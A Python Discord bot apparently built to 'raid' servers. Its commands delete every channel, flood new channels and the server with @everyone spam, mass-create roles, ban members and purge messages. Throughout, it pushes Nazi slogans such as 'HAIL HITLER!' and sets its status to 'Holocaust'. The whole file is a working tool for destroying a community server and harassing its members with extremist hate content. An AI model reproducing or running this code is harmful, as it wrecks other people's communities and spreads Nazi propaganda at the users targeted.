from discord import *
from discord.ext import commands
import discord, asyncio, random, time

TOKEN = "" # put your token here

# intents
pr = discord.ext.commands.bot
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True

# class MyClient(discord.Client):
#     async def on_ready(self):
#         print('Logged on as', self.user)

#     async def on_message(self, message):
#         # don't respond to ourselves
#         if message.author == self.user:
#             return

#         if message.content == 'ping':
#             await message.channel.send('pong')


#client = MyClient(intents=intents)

client = commands.Bot(command_prefix=">", description="Reich III official bot", intents=intents)

# test command
@client.command()
async def test(ctx):
    await ctx.send("HAiL ALEMANIA!! @everyone")

# some commands

@client.command()
async def say(ctx, *, text):
    await ctx.send(text)
    await ctx.message.delete()

@client.command()
async def purge(ctx, *, arg):
	await ctx.channel.purge(limit=int(arg))

@client.command(pass_context=True)
async def spam(ctx):
    await ctx.message.delete()

    for i in range(0, 20):
        time.sleep(.4) # 0.4 segundos de delay para evitar ser kickeado de la API de Discord
        await ctx.send("RAID BY SchutzStaffel @everyone")

@client.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()

    for i in range(0, 10):
        guild = ctx.guild
        time.sleep(.4) # 0.4 segundos de delay para evitar ser kickeado de la API de Discord
        await guild.create_role(name="HAIL HITLER!")

@client.command(pass_context=True)
async def channels(ctx):
    try:
        for channel in ctx.guild.channels:
            time.sleep(.4) # 0.4 segundos de delay para evitar ser kickeado de la API de Discord
            await channel.delete()
    except:
        pass

    await ctx.message.delete()
    guild = ctx.message.guild

    for i in range(0, 10):
        time.sleep(.4) # 0.4 segundos de delay para evitar ser kickeado de la API de Discord
        await guild.create_text_channel('RAIDED BY A.Hitler @everyone')

@client.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Holocaust"))
    print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")


@client.event
async def on_guild_channel_create(channel):
    for i in range(0, 10):
        time.sleep(.4) # 0.4 segundos de delay para evitar ser kickeado de la API de Discord
        await channel.send("Raided by schutzstaffel @everyone")

"""
@client.event
async def on_message(ctx, message):
    await message.delete()
    await ctx.send("Hail Alemania! Hail Hitler! HAIL FUHRER!! @everyone")

"""

client.run(TOKEN)
